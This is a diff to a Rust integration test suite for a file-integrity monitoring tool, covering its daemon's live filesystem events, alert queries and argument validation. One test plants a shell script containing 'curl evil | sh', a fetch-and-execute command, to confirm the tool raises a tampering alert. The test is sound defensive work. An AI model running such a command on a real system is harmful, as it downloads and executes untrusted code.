@@ -329,8 +329,8 @@ fn unavailable_commands_exit_7_with_json_error() {
     let env = Env::new();
     for args in [
         vec!["scan", "--kernel"],
-        vec!["events"],
-        vec!["alerts", "list"],
+        vec!["alerts", "ack", "1"],
+        vec!["alerts", "export"],
         vec!["processes"],
         vec!["rules", "list"],
         vec!["report", "summary"],
@@ -370,6 +370,34 @@ fn daemon_runs_reports_health_and_stops_cleanly() {
         let (_, v) = env.json(&["status"]);
         v["monitoring"]["state"] == "running"
     });
+    let (_, v) = env.json(&["status"]);
+    let fs = v["sensors"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|s| s["sensor"] == "fs")
+        .unwrap_or_else(|| panic!("no fs sensor: {v}"));
+    assert_eq!(fs["state"], "running", "{v}");
+    assert!(v["agent"]["fs_sensor_state"].is_string(), "{v}");
+
+    // A change is seen live and recorded as an event, even without an
+    // approved baseline (there is nothing to alert against yet).
+    std::fs::write(env.root().join("etc/app.conf"), b"setting = 2\n").unwrap();
+    wait_until("file.modified event", || {
+        let (_, v) = env.json(&["events", "--type", "file"]);
+        v["events"].as_array().unwrap().iter().any(|e| {
+            e["type"] == "file.modified" && e["path"].as_str().unwrap().ends_with("etc/app.conf")
+        })
+    });
+    let (code, v) = env.json(&["verify", "--component", "sensors"]);
+    assert!(
+        v["checks"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|c| c["name"] == "fs_sensor" && c["state"] == "pass"),
+        "{code} {v}"
+    );
 
     // SIGTERM via kill(1): the workspace forbids unsafe code, so no libc.
     let ok = StdCommand::new("kill")
@@ -410,6 +438,34 @@ fn crashed_daemon_is_reported_not_responding() {
     assert_eq!(code, 4);
     let (_, v) = env.json(&["status"]);
     assert_eq!(v["monitoring"]["state"], "not_responding");
+}
+
+#[test]
+fn events_and_alerts_queries() {
+    let env = Env::new();
+    env.init();
+    let (code, v) = env.json(&["events", "--since", "1h", "--severity", "info"]);
+    assert_eq!(code, 0, "{v}");
+    assert!(v["events"].is_array());
+    let (code, v) = env.json(&["alerts", "list", "--status", "open"]);
+    assert_eq!(code, 0, "{v}");
+    assert_eq!(v["total_matching"], 0);
+    env.cmd()
+        .args(["alerts", "list"])
+        .assert()
+        .success()
+        .stdout(predicate::str::contains("No alerts match."));
+
+    let (code, _) = env.json(&["alerts", "show", "42"]);
+    assert_eq!(code, 2);
+    for bad in [
+        vec!["events", "--since", "yesterday-ish"],
+        vec!["events", "--severity", "urgent"],
+        vec!["alerts", "list", "--status", "pending"],
+    ] {
+        let (code, v) = env.json(&bad);
+        assert_eq!(code, 2, "{bad:?}: {v}");
+    }
 }
 
 fn is_root() -> bool {
@@ -700,4 +756,56 @@ fn unreadable_paths_are_reported_as_gaps() {
             .any(|c| c["component"] == "coverage" && c["name"] == "inaccessible")
     );
     std::fs::set_permissions(&secret, std::fs::Permissions::from_mode(0o755)).unwrap();
+}
+
+#[test]
+fn daemon_alerts_on_live_change() {
+    require_root!();
+    let env = Env::new();
+    env.init_approved();
+    let mut child = env.spawn_daemon();
+    wait_until("agent running", || {
+        let (_, v) = env.json(&["status"]);
+        v["monitoring"]["state"] == "running" && v["agent"]["last_reconciliation"].is_string()
+    });
+
+    std::fs::write(env.root().join("bin/tool"), b"#!/bin/sh\ncurl evil | sh\n").unwrap();
+    let mut id = 0;
+    wait_until("FIM-003 alert", || {
+        let (_, v) = env.json(&["alerts", "list"]);
+        match v["alerts"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .find(|a| a["rule_id"] == "FIM-003")
+        {
+            Some(a) => {
+                id = a["id"].as_u64().unwrap();
+                true
+            }
+            None => false,
+        }
+    });
+    let (code, v) = env.json(&["alerts", "show", &id.to_string()]);
+    assert_eq!(code, 0, "{v}");
+    assert!(v["object"].as_str().unwrap().ends_with("bin/tool"));
+    assert_eq!(v["evidence"]["source"], "fs_event", "{v}");
+    assert_ne!(
+        v["evidence"]["baseline"]["sha256"], v["evidence"]["current"]["sha256"],
+        "{v}"
+    );
+    assert_eq!(v["history"][0]["action"], "created");
+    env.cmd()
+        .args(["alerts", "show", &id.to_string()])
+        .assert()
+        .success()
+        .stdout(predicate::str::contains("Recommendation"));
+
+    // Status reports the open alert as a finding.
+    let (code, v) = env.json(&["status"]);
+    assert_eq!(code, 1);
+    assert!(v["open_alerts"]["total"].as_u64().unwrap() >= 1, "{v}");
+
+    child.kill().unwrap();
+    child.wait().unwrap();
 }
